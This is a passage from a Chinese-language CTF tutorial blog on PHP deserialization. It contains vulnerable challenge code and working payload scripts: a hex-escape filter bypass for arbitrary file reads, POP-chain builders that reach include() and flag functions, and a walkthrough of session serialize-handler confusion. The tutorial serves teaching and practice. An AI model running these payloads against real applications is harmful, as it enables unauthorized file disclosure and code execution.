<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;name, <span class="string">&quot;flag&quot;</span>)!==False) </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;/etc/passwd&quot;</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;user = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$input</span>, <span class="string">&#x27;user&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>像如上代码比较复杂的可以先定位魔术方法与漏洞触发点。在代码中发现__toString () 魔术方法调用了 file_get_contents () 来读取变量name的数据。当程序执行结束或者变量销毁时就会自动调用析构函数__destruct()并使用echo输出变量，__toString()方法在此时会被自动调用。关键在于如果能控制变量 name，就可以造成任意文件读取漏洞。但是通读代码发现前端传入的可控数据只有变量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mtext>，并且传入的</mtext></mrow><annotation encoding="application/x-tex">user，并且传入的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span></span></span></span> user 还不能包含 “user” 子符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">paload:</span><br><span class="line">&lt;?php</span><br><span class="line">class MyFile &#123;</span><br><span class="line">    public $name = &#x27;/etc/hosts&#x27;;</span><br><span class="line">    public $user = &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new MyFile();</span><br><span class="line">$a-&gt;name = &amp;$a-&gt;user;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$b = str_replace(&quot;user&quot;, &quot;use\\72&quot;, $b);</span><br><span class="line">$b = str_replace(&quot;s&quot;, &quot;S&quot;, $b);</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//通过浅拷贝绕过 if(stristr($this-&gt;name, &quot;flag&quot;)!==False) </span><br><span class="line">//通过十六进制绕过if(stristr($input, &#x27;user&#x27;)!==False)</span><br></pre></td></tr></table></figure>
<p>一般 POP 链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行。</p>
<h4 id="0x08"><a class="markdownIt-Anchor" href="#0x08">#</a> 0x08</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1 = <span class="keyword">new</span> <span class="title class_">Call</span>();　　<span class="comment">//把$mod1赋值为Call类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1 = <span class="keyword">new</span> <span class="title function_ invoke__">funct</span>();　　<span class="comment">//把 $mod1赋值为funct类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1= <span class="keyword">new</span> <span class="title function_ invoke__">func</span>();　　<span class="comment">//把 $mod1赋值为func类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1= <span class="keyword">new</span> <span class="title function_ invoke__">string1</span>();　　<span class="comment">//把 $mod1赋值为string1类对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1= <span class="keyword">new</span> <span class="title class_">GetFlag</span>();　　<span class="comment">//把 $str1赋值为GetFlag类对象      </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> start_gg;　　<span class="comment">//构造start_gg类对象$b</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));　　<span class="comment">//显示输出url编码后的序列化对象</span></span><br></pre></td></tr></table></figure>
<h4 id="0x09"><a class="markdownIt-Anchor" href="#0x09">#</a> 0x09</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &quot;D://1.txt&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new Show();</span><br><span class="line">$a-&gt;source = $a;</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>后面两个例子其实都是一样，原理懒的分析了～</p>
<h4 id="php_session-反序列化"><a class="markdownIt-Anchor" href="#php_session-反序列化">#</a> PHP_session 反序列化</h4>
<p>当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<p><strong>session_start 的作用</strong></p>
<p>当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。</p>
<p><strong>Session 存储机制</strong></p>
<p>PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。</p>
<p>先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：</p>
<p>在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同</p>
<table>
<thead>
<tr>
<th><strong>存储引擎</strong></th>
<th><strong>存储方式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</td>
</tr>
<tr>
<td>php</td>
<td>键名 + 竖线 + 经过 serialize () 函数序列处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>(PHP&gt;5.5.4) 经过 serialize () 函数序列化处理的数组</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:5:&quot;aaaaa&quot;;    //php</span><br><span class="line">usernames:5:&quot;bbbbb&quot;;    //php_binary,最前面为ASCII中的不可见字符</span><br><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:5:&quot;bbbbb&quot;;&#125;    //php_serialize</span><br></pre></td></tr></table></figure>
<p><strong>Session 反序列化漏洞</strong></p>
<p>PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，<strong>漏洞主要是由于使用不同的引擎来处理 session 文件造成的</strong>。</p>
<p>存在对 $_SESSION 变量赋值</p>
<p>漏洞的主要原因在于不同的引擎对于竖杠’ | ' 的解析产生歧义。</p>
<p>对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | ' 后的值进行反序列化处理。</p>
<p>举个例子：</p>
<p>先使用 php_serialize 引擎来存储 Session，在使用 php 引擎读取 session</p>
<p>Session1.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;username&#x27;] = $_GET[&#x27;user&#x27;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接下来使用 php 引擎来读取 Session 文件</p>
<p>Session2.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class user&#123;</span><br><span class="line">    var $name;</span><br><span class="line">    var $age;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        echo &quot;hello &quot;.$this-&gt;name.&quot; !&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uc2Vzc2lvbi1zZXQtc2F2ZS1oYW5kbGVyLnBocA==">session_set_save_handler()</span> 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</p>
</blockquote>
